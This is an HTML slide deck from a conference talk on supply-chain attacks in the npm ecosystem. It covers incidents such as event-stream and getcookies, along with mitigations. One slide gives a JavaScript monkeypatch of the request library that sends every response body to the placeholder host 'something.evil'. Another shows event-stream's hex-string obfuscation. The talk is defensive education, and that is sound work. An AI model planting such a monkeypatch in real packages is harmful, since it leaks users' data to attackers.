@@ -1,0 +1,555 @@
+<!doctype html>
+<html>
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Real World Attacks in the npm Ecosystem by @tlhunter</title>
+    <link rel="stylesheet" href="css/reveal.css">
+    <link rel="stylesheet" href="css/theme/black.css">
+    <link rel="stylesheet" href="lib/css/hybrid.css">
+    <script>
+      var link = document.createElement('link');
+      link.rel = 'stylesheet';
+      link.type = 'text/css';
+      link.href = window.location.search.match(/print-pdf/gi) ? 'css/print/pdf.css' : 'css/print/paper.css';
+      document.getElementsByTagName('head')[0].appendChild(link);
+    </script>
+<style>
+:root {
+  --zeta: #111111;
+  --alpha: #242425;
+  --beta: #424558;
+  --gamma: #959EBF;
+  --delta: #B8C5D8;
+  --epsilon: #E1EAF3;
+  --omega: #95BFA4; /* gamma + 1/3 */
+  --theta: #BFBD95; /* gamma - 1/3 */
+}
+body {
+  background-color: var(--alpha);
+}
+
+.reveal pre {
+  font-size: 0.7em;
+  width: 100%;
+  box-shadow: none;
+}
+.reveal pre .nl {
+  color: var(--epsilon);
+}
+.reveal pre code {
+  max-height: 500px;
+  padding: 0px;
+}
+.reveal p code,
+.reveal li code {
+  background-color: var(--epsilon);
+  border-radius: 8px;
+  color: var(--beta);
+  padding: 2px 10px;
+}
+.reveal li code,
+.reveal p code,
+.reveal h3 code {
+  font-size: 0.8em;
+}
+.reveal li code a {
+  color: var(--beta);
+}
+
+.reveal h1,
+.reveal h2,
+.reveal h3,
+.reveal h4,
+.reveal h5,
+.reveal h6 {
+  text-transform: initial;
+}
+.reveal h1,
+.reveal h2,
+.reveal h3,
+.attention {
+  color: var(--epsilon);
+  text-shadow: 0px 1px 5px var(--zeta);
+}
+.reveal h3 {
+  color: var(--gamma);
+}
+
+.reveal section img {
+  border: none;
+}
+.reveal blockquote {
+  text-align: left;
+  width: auto;
+}
+.reveal blockquote .author {
+  text-align: right;
+}
+.reveal a {
+  color: var(--omega);
+}
+.reveal a:hover {
+  color: var(--theta);
+}
+.reveal pre .highlight {
+  color: var(--delta);
+}
+
+.reveal .progress span {
+  background-color: var(--delta);
+}
+.reveal .controls {
+  color: var(--gamma);
+}
+
+#twitter {
+  left: 20px;
+}
+#website {
+  right: 20px;
+}
+.floater {
+  position: absolute;
+  bottom: 20px;
+  font-size: 3em;
+  z-index: 1;
+}
+.floater, .floater a {
+  color: var(--gamma);
+  text-decoration: none;
+  font-family: "Source Sans Pro", Helvetica, sans-serif;
+  font-weight: 600;
+  text-shadow: 0px 1px 5px var(--zeta);
+}
+</style>
+  </head>
+  <body>
+    <div id="twitter" class="floater"><a href="https://twitter.com/tlhunter">@tlhunter</a></div>
+    <div id="website" class="floater"><a href="https://intrinsic.com">intrinsic.com</a></div>
+
+    <div class="reveal">
+      <div class="slides">
+
+        <section class="intro">
+          <h2>Real World Attacks<br />in the npm Ecosystem</h2>
+          <h3>Thomas Hunter II</h3>
+
+          <!-- <img src="./images/intrinsic.svg" width="35%" style="background: transparent; box-shadow: none;" /> -->
+        </section>
+
+
+        <section>
+          <h2>Roadmap</h2>
+
+          <ol>
+            <li><a href="#/chapter-1">Where we are Today</a></li>
+            <li><a href="#/chapter-2">Cracks in the Surface</a></li>
+            <li><a href="#/chapter-3">Known Incidents</a></li>
+            <li><a href="#/chapter-4">Hard Problem to Solve</a></li>
+            <li><a href="#/chapter-5">Mitigation</a></li>
+          </ol>
+        </section>
+
+
+        <section id="chapter-1">
+          <h2>Where we are Today</h2>
+        </section>
+
+
+        <section>
+          <h3>JavaScript and Node.js are Popular</h3>
+
+          <img src="./images/survey-so-popularity-over-time.png" width="75%" />
+
+          <div><small>Source: <a href="https://insights.stackoverflow.com/survey/2017#technology-languages-over-time">Stack Overflow Developer Survey 2017</a></small></div>
+        </section>
+
+
+        <section>
+          <h3>npm is Popular</h3>
+
+          <img src="./images/survey-npm-module-count.png" width="50%" />
+
+          <div><small>Source: <a href="https://blog.npmjs.org/post/180868064080/this-year-in-javascript-2018-in-review-and-npms">npm This year in JavaScript 2018</a></small></div>
+        </section>
+
+
+        <section>
+          <h3>Your App is Mostly Third-Party</h3>
+
+          <ul>
+            <li><a href="https://slides.com/seldo/npm-and-the-future-of-javascript/#/8">npm</a> reports 97%</li>
+            <li>Try it on your own codebase:</li>
+            <li><code>$ npx @intrinsic/loc</code>
+              <ul>
+                <li>Results from 7 corporate codebases:</li>
+                <li>94.5% - 99.7% Node Modules</li>
+              </ul>
+            </li>
+          </ul>
+
+<pre class="plain"><code>
+Your application code:    68,490 lines ( 2.44%)
+`node_modules` code:   2,740,694 lines (97.56%)</code></pre>
+        </section>
+
+
+        <section>
+          <h3>What's that mean?</h3>
+
+          <p>We've become quite the lucrative target.</p>
+        </section>
+
+
+        <section id="chapter-2">
+          <h2>Cracks in the Surface</h2>
+        </section>
+
+
+        <section>
+          <h3>Supply Chain Risks via npm</h3>
+
+          <ul>
+            <li>Developer Mistakes: Accidentally dangerous code</li>
+            <li>Malicious Modules: Package is always evil</li>
+            <li>Ownership Transfer: Package can become evil</li>
+          </ul>
+        </section>
+
+
+        <section>
+          <h3>@ChALkeR's Research</h3>
+          <img width="50%" src="images/chalker-before.png" />
+          <div><small>Source: <a href="https://github.com/ChALkeR/notes/blob/master/Gathering-weak-npm-credentials.md">Gathering weak npm credentials</a> — June 6th, 2017</small></div>
+        </section>
+
+
+        <section>
+          <h3>@ChALkeR's Research</h3>
+          <img width="50%" src="images/chalker-after.png" />
+          <div><small>Source: <a href="https://github.com/ChALkeR/notes/blob/master/Gathering-weak-npm-credentials.md">Gathering weak npm credentials</a> — June 6th, 2017</small></div>
+        </section>
+
+
+        <section>
+          <h3>Thought Experiment</h3>
+
+          <ul>
+            <li>What if @ChALkeR had been malicious?</li>
+          </ul>
+        </section>
+
+
+        <section id="chapter-3">
+          <h2>Known Incidents</h2>
+        </section>
+
+
+        <section>
+          <h3>Module: <code>left-pad</code></h3>
+
+          <ul>
+            <li>Unpublished on <a href="https://blog.npmjs.org/post/141577284765/kik-left-pad-and-npm">March 22nd, 2016</a></li>
+            <li>All hell broke loose</li>
+            <li>A well-intended user republished the module</li>
+            <li><em>We got lucky: This was not a security incident</em></li>
+          </ul>
+        </section>
+
+
+        <section>
+          <h3>Module: <code>getcookies</code></h3>
+
+          <ul>
+            <li>Discovered and unpublished on <a href="https://blog.npmjs.org/post/173526807575/reported-malicious-module-getcookies">May 2nd, 2018</a></li>
+            <li>Looks for special headers and runs arbitrary code</li>
+            <li><code>getcookies</code> was a deep dep of <code>mailparser</code></li>
+            <li><code>mailparser</code> had 64,000 weekly downloads</li>
+          </ul>
+        </section>
+
+
+        <section>
+          <h3>Module: <code>event-stream</code></h3>
+
+          <ul>
+            <li>Discovered and unpublished on <a href="https://medium.com/intrinsic/compromised-npm-package-event-stream-d47d08605502">Nov 26th, 2018</a></li>
+            <li>Malicious <code>flatmap-stream</code> added as dep
+              <ul>
+                <li>Happened after ownership transfer</li>
+              </ul>
+            </li>
+            <li>Highly Targeted: Only affected <strong>Copay</strong> app
+              <ul>
+                <li>Module used encoded strings, test file</li>
+                <li>Password was <code>description</code> field of <strong>Copay</strong></li>
+              </ul>
+            </li>
+            <li>Code in GitHub differed from npm
+              <ul>
+                <li>Which is why we made <a href="https://diff.intrinsic.com/">Package Diff</a></li>
+              </ul>
+            </li>
+          </ul>
+        </section>
+
+
+        <section>
+          <h3>Package Diff</h3>
+
+          <img src="images/package-diff.png" />
+
+          <div><small>Source: <a href="https://diff.intrinsic.com/webpack-rtl-plugin/1.8.0/1.8.1">diff.intrinsic.com/webpack-rtl-plugin/1.8.0/1.8.1</a> | <a href="https://github.com/Automattic/wp-calypso/pull/31138">Automattic/wp-calypso#31138</a></small></div>
+        </section>
+
+
+        <section>
+          <h3>Other Malicious Modules</h3>
+
+          <ul>
+            <li><code><a href="https://snyk.io/vuln/SNYK-JS-BOOGEYMAN-173686">bookeyman</a></code>: Feb 13, 2019</li>
+            <li><code><a href="https://snyk.io/vuln/SNYK-JS-STREAMCOMBINE-173670">stream-combine@2.0.2</a></code>: Feb 10, 2019</li>
+            <li><code><a href="https://snyk.io/vuln/SNYK-JS-PORTIONFATTY12-73508">portionfatty12</a></code>: Jan 15, 2019</li>
+            <li><code><a href="https://snyk.io/vuln/SNYK-JS-RRGOD-73507">rrgod</a></code>: Jan 15, 2019</li>
+            <li><code><a href="https://snyk.io/vuln/SNYK-JS-TEXTQRCODE-73501">text-qrcode</a></code>: Jan 10, 2019</li>
+            <li><code><a href="https://snyk.io/vuln/SNYK-JS-COMMANDERJS-73506">commander-js</a></code>: Jan 9, 2019</li>
+            <li><code><a href="https://snyk.io/vuln/SNYK-JS-ESLINTCONFIGESLINT-72491">eslint-config-eslint@5.0.2</a></code>: Jul 13, 2018</li>
+          </ul>
+
+          <p><small>Source: <a href="https://snyk.io/vuln/?type=npm">Snyk Vulnerability DB</a></small></p>
+        </section>
+
+
+        <section>
+          <h3>Malicious Modules Gaining Popularity</h3>
+
+          <ul>
+            <li>npm unpublishes malicious modules
+              <ul>
+                <li>This is a game of cat and mouse</li>
+              </ul>
+            </li>
+            <li>Ownership transfers: good can become evil</li>
+            <li>Victim of our own success: think Windows viruses</li>
+            <li>Typo Squatting: <a href="https://snyk.io/vuln/npm:discordi.js:20171009">discordi.js</a>, <a href="https://snyk.io/vuln/npm:jquey:20171006">jquey</a>, <a href="https://snyk.io/vuln/npm:coffescript:20171006">coffescript</a></li>
+          </ul>
+        </section>
+
+        <section>
+          <h3>Example: Global Monkeypatching</h3>
+<pre><code language="javascript">const REQUEST = require('request');
+const _Req = REQUEST.Request;
+REQUEST.Request = (opts) =&gt; { // monkeypatch
+  const _callback = opts.callback;
+  opts.callback = function (_e, _r, body) {
+    const req = require('http').request({
+      hostname: 'something.evil', method: 'POST'
+    });
+    req.write(JSON.stringify(body)).end();
+    _callback.apply(this, arguments);
+  };
+  return new.target ?
+    Reflect.construct(_Req, [opts]) : _Req(opts);
+};</code></pre>
+        </section>
+
+
+        <section id="chapter-4">
+          <h2>Hard Problem to Solve</h2>
+        </section>
+
+
+        <section>
+          <h3>Static Analysis won't save you</h3>
+
+          <ul>
+            <li><code>event-stream</code> incident used encoded strings</li>
+          </ul>
+
+<pre><code class="javascript">function d(str) {
+  return Buffer.from(str, 'hex').toString();
+}
+
+d("6372656174654465636970686572"); // "createDecipher"
+
+require(d(n[2]))[d(n[6])](d(n[5]); // minified version
+require('crypto')['createDecipher']('aes256', pkgDesc);
+</code></pre>
+        </section>
+
+
+        <section>
+          <h3>OSS Ownership Transfer</h3>
+
+          <ul>
+            <li>Need a better system for ownership transfer</li>
+            <li>Affects all of OSS, not just npm</li>
+            <li>Should npm force Semver major with new owner?
+              <ul>
+                <li>What about every new collaborator?</li>
+              </ul>
+            </li>
+          </ul>
+        </section>
+
+
+        <section>
+          <h3>Need a “CSP for Node.js”</h3>
+
+          <ul>
+            <li><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy">Content-Security-Policy</a> browser header</li>
+            <li>Declaratively list I/O requirements
+              <ul>
+                <li>Deno has an all or nothing version of this
+                  <ul>
+                    <li><code>--allow-write</code>, <code>--allow-net</code></li>
+                  </ul>
+                </li>
+                <li>PR: <a href="https://github.com/nodejs/node/pull/22112">process: initial impl of feature access control</a></li>
+                <li>Intrinsic offers a <a href="https://medium.com/intrinsic/securing-node-js-applications-with-intrinsic-db47ff86cff8">fine-grained implementation</a></li>
+              </ul>
+            </li>
+            <li>Per-module would be awesome, but is impossible
+              <ul>
+                <li>What would the policy for <code>request</code> be?</li>
+                <li>What if you pass around a <code>Socket</code> instance?</li>
+              </ul>
+            </li>
+          </ul>
+        </section>
+
+
+        <section>
+          <h3>Intrinsic Policies</h3>
+<pre><code language="javascript">const PG = 'postgres://pguser@pghost:9876/auth';
+const REDIS = 'redis://redishost:6379/1';
+routes.allRoutes(policy =&gt; {
+  policy.sql.allowConnect(PG);
+  policy.redis.allowConnect(REDIS);
+});
+routes.get('/users/*', policy =&gt; {
+  policy.redis.allowCommandKey(REDIS, 'GET', 'user-*');
+  policy.sql.allowQuery(PG, 'SELECT * FROM users');
+});
+routes.post('/admin/lock', policy =&gt; {
+  policy.fs.allowWrite('/tmp/app.lock');
+  policy.outboundHttp.allowGet('http://example.org/');
+});</code></pre>
+        </section>
+
+
+        <section id="chapter-5">
+          <h2>Mitigation</h2>
+        </section>
+
+
+        <section>
+          <h3>npm Account Housekeeping</h3>
+
+          <ul>
+            <li>Enable Two-Factor Authentication</li>
+            <li>Use a one-off password, password manager</li>
+          </ul>
+        </section>
+
+
+        <section>
+          <h3>Favor Packages without Dependencies</h3>
+
+          <ul>
+            <li>Or at least prefer modules with fewer deps</li>
+            <li><em>(I wish npm had a badge)</em></li>
+          </ul>
+        </section>
+
+        <section>
+          <h3>Automated Audits</h3>
+
+          <p>Run <code>npm audit</code> periodically, update when possible.</p>
+
+          <img width="40%" src="images/npm-audit.png" />
+        </section>
+
+
+        <section>
+          <h3>Interpersonal Mitigation</h3>
+
+          <ul>
+            <li>Research potential module maintainers</li>
+            <li>Only pass ownership to established users</li>
+            <li>Donate money to package owners, bounties</li>
+          </ul>
+        </section>
+
+
+        <section>
+          <h3>Mitigation by npm</h3>
+
+          <ul>
+            <!-- left-pad -->
+            <li>Only npm may unpublish a module</li>
+
+            <!-- @ChALkeR inspired -->
+            <li>Brute force login detection</li>
+            <li>Reject weak passwords upon registration</li>
+            <li>Replace <code>.npmrc</code> password with token</li>
+            <li>Added 2FA support</li>
+
+            <!-- Further changes -->
+            <li>Acquired security company <strong>^Lift</strong> + NSP database</li>
+            <li>The NSP database became <code>npm audit</code></li>
+            <li>Actively unpublish malicious modules</li>
+          </ul>
+        </section>
+
+
+        <section id="further-reading">
+          <h3>Further Reading</h3>
+          <ul>
+            <li>The Dangers of Malicious Modules<br /><code><a href="https://bit.ly/2ysIjUc">bit.ly/2ysIjUc</a></code></li>
+            <li>Compromised npm Package: event-stream<br /><code><a href="https://bit.ly/2FL0AzJ">bit.ly/2FL0AzJ</a></code></li>
+            <li>Gathering weak npm credentials (@ChALkeR)<br /><code><a href="https://bit.ly/2sFDwYX">bit.ly/2sFDwYX</a></code></li>
+            <!-- Stack Overflow Developer Survey 2018: https://insights.stackoverflow.com/survey/2018 -->
+            <!-- 2018 Node.js User Survey Report: https://nodejs.org/en/user-survey-report/ -->
+            <!-- npm This year in JavaScript: 2018: https://blog.npmjs.org/post/180868064080/this-year-in-javascript-2018-in-review-and-npms -->
+          </ul>
+        </section>
+
+
+        <section id="final">
+          <h3>Fin</h3>
+
+          <ul>
+            <li>Follow me: <code><a href="https://twitter.com/tlhunter">@tlhunter</a></code></li>
+            <li>About Intrinsic: <code><a href="https://intrinsic.com">intrinsic.com</a></code></li>
+            <li>Package Diff: <code><a href="https://diff.intrinsic.com">diff.intrinsic.com</a></code></li>
+            <li>This presentation: <code><a href="https://bit.ly/2IWa50A">bit.ly/2IWa50A</a></code></li>
+          </ul>
+        </section>
+
+
+      </div>
+    </div>
+
+    <script src="lib/js/head.min.js"></script>
+    <script src="js/reveal.js"></script>
+
+    <script>
+      Reveal.initialize({
+        transition: 'none',
+        center: true,
+        touch: true,
+        controls: false,
+        controlsTutorial: false,
+        controlsLayout: 'edges',
+        controlsBackArrows: 'visible',
+        history: true,
+        help: false,
+        dependencies: [
+          { src: 'plugin/highlight/highlight.js', async: true, callback: function() { hljs.initHighlightingOnLoad(); } }
+        ]
+      });
+    </script>
+  </body>
+</html>
